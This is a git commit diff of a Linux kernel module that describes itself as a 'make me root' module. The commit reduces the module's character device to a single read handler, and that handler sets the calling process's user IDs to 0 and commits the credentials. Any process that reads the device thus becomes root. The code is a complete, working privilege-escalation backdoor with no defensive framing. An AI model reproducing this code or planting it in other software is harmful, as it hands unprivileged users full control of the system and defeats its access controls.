a6310ef552b103ef0cd7cac0783290c5d20b3965
knilch0r <knilch0r@users.noreply.github.com>
2021-03-31 20:05:14 +0200

    cleanups, we only need read().

--- knilchroot.c
+++ knilchroot.c
@@ -10,40 +10,25 @@ MODULE_DESCRIPTION("a 'make me root' knilchroot");
 MODULE_VERSION("0.0");
 
 
-/* Prototypes for knilchroot functions */
-static int knilchroot_open(struct inode *, struct file *);
-
-static int knilchroot_release(struct inode *, struct file *);
 static ssize_t knilchroot_read(struct file *, char *, size_t, loff_t *);
-static ssize_t knilchroot_write(struct file *, const char *, size_t, loff_t *);
 
 static int major_num;
 
 static struct file_operations file_ops = {
+	.owner = THIS_MODULE,
 	.read = knilchroot_read,
-	.write = knilchroot_write,
-	.open = knilchroot_open,
-	.release = knilchroot_release
 };
 
 static ssize_t knilchroot_read(struct file *f, __user char *b, size_t l, loff_t *o) {
+	struct cred * c = prepare_creds();
+	printk(KERN_INFO "hello there.\n");
+	if (!c) return -ENOMEM;
+	c->uid = KUIDT_INIT(0);
+	c->euid = KUIDT_INIT(0);
+	c->suid = KUIDT_INIT(0);
+	commit_creds(c);
 	return 0;
 }
-
-static ssize_t knilchroot_write(struct file *f, const char *b, size_t l, loff_t *o) {
-	return 0;
-}
-
-static int knilchroot_open(struct inode *inode, struct file *file) {
-	try_module_get(THIS_MODULE);
-	return 0;
-}
-
-static int knilchroot_release(struct inode *inode, struct file *file) {
-	module_put(THIS_MODULE);
-	return 0;
-}
-
 
 static int __init knilchroot_init(void) {
 	major_num = register_chrdev(0, "knilchroot", &file_ops);
@@ -58,7 +43,7 @@ static int __init knilchroot_init(void) {
 
 static void __exit knilchroot_exit(void) {
 	unregister_chrdev(major_num, "knilchroot");
-	printk(KERN_INFO "knilchroot unloaded");
+	printk(KERN_INFO "knilchroot unloaded\n");
 }
 
 module_init(knilchroot_init);
